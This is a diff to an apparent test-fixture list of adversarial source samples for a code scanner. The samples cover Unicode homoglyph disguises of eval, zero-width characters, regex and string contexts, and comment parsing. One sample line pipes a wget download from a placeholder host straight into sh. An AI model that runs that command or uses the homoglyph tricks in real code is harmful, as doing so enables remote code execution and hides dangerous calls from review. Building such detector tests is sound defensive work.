@@ -81,7 +81,13 @@ ADVERSARIAL = [
     ("pipe_shell.py", "py", "import subprocess\nsubprocess.run('wget -qO- https://files.invalid/i.sh | sh', shell=True)\n"),
     ("lookalike.js", "js", "const \u0435val = eval;\n\u0435val(x);\nif (isAdm\u0456n) {}\nconst isAdmin = 1;\nconst v\u0430lue = 2;\neva\u200dl(y);\n"),
     ("lookalike.py", "py", "\u0435val = eval\n\u0435val(input())\n"),
-    ("lookalike_regex.js", "js", "const re = /[\\uFF07\\uFF10]/;\nx = /[\u0430-\u044f]/;\n"),
+    ("lookalike_regex.js", "js", "const re = /[\\uFF07\\uFF10]/;\nx = /[\u0430-\u044f]/;\n"
+     "var u = /^(?:(?:http[s\\u017F]?|ftp):\\/\\/)/i;\nconst ok = /^[a-zA-Z\u0430-\u044f]+$/.test(s);\n"
+     "const r = a / v\u0430lue / 2;\n"),
+    ("lookalike_strings.js", "js", "const s = 'it\\'s' + \u0435val(x) + 'y';\nconst t = `\n  v\u0430lue ${\u0435val(x)}\n`;\n"
+     'const q = "a\\\n\u0435val";\n'),
+    ("lookalike_strings.py", "py", 'def f():\n    """\n    v\u0430lue\n    """\n    return \u0435val(x)\n'
+     "s = 'it\\'s' + \u0435val(x) + 'y'\nx = f'{\u0435val(p)}'\n"),
     # FIX-SPEC 1: comment state across lines; U+2028/U+2029 end JS lines
     ("blockcomment.js", "js", "/*\n eval(x)\n*/\n/**/eval(y)\n"),
     ("comments.js", "js", "/* start\n * eval(a)\n */ eval(b)\n  * eval(c)\nconst r = /\\/*/; eval(d)\n"
